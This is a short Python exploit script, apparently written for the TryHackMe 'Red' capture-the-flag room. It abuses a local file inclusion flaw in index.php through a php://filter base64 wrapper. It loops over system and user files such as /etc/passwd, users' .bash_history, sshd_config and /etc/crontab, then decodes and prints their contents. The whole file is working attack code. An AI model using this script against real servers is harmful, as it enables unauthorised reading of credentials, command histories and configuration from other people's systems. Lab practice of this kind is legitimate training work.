"""
Author      : AnyGuy
Date        : 2023-08-03

Title       : make-requests-to-website.py

Description : TryHackMe - Red
    
    - https://tryhackme.com/room/redisl33t
    - xy
    - xy

"""

# Import Libraries
import requests
import base64

def send_payload(url, payload):
    full_url = url.format(payload)
    response = requests.get(full_url)
    return response.text

def decode_base64(base64_message):
    base64_bytes = base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    return message

def main():
    url = "http://10.10.212.150/index.php?page=php://filter/convert.base64-encode/resource={}"
    payloads = ["/etc/passwd", "/home/red/.bash_history", "/home/blue/.bash_history", "/etc/hosts", "/proc/version", "/proc/cmdline", "/etc/ssh/sshd_config", "/etc/vsftpd.conf", "/etc/crontab"]

    for payload in payloads:
        print(f"Sending payload: {payload}")
        base64_response = send_payload(url, payload)
        decoded_response = decode_base64(base64_response)
        print(f"Decoded response: \n{decoded_response}\n")

if __name__ == "__main__":
    main()
